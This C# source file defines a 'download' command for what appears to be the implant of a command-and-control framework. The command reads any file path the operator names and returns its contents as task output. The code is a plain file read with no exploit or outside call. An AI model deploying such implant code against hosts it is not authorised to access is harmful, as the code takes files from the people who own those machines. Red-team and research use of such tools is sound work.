using System;
using System.IO;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class Download : EngineerCommand
    {
        public override string Name => "download";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                //read file from file string as a byte array and return it
                if (task.Arguments.TryGetValue("/file", out string file))
                {
                    byte[] content = File.ReadAllBytes(file);
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(content, task, EngTaskStatus.Complete, TaskResponseType.FilePart);
                }
                else
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("missing /file argument for download target", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                }
            }
            catch (Exception ex)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
            }

        }
    }
}
